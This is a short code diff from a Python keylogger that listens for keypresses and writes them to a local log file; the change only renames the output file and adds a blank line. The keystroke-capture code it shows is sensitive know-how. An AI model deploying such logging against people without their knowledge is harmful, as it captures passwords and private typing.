@@ -12,7 +12,7 @@ def on_press(key):
         print('special key {0} pressed'.format(key))
         
 def write_file(keys):
-    with open('loge_2.txt', 'w') as f:
+    with open('log.txt', 'w') as f:
         for key in keys:
             k = str(key).replace("'", " ")
             f.write(k)
@@ -24,4 +24,5 @@ def on_relase(key):
         return False
     
 with Listener (on_press=on_press, on_release=on_relase) as listner:
+
     listner.join()
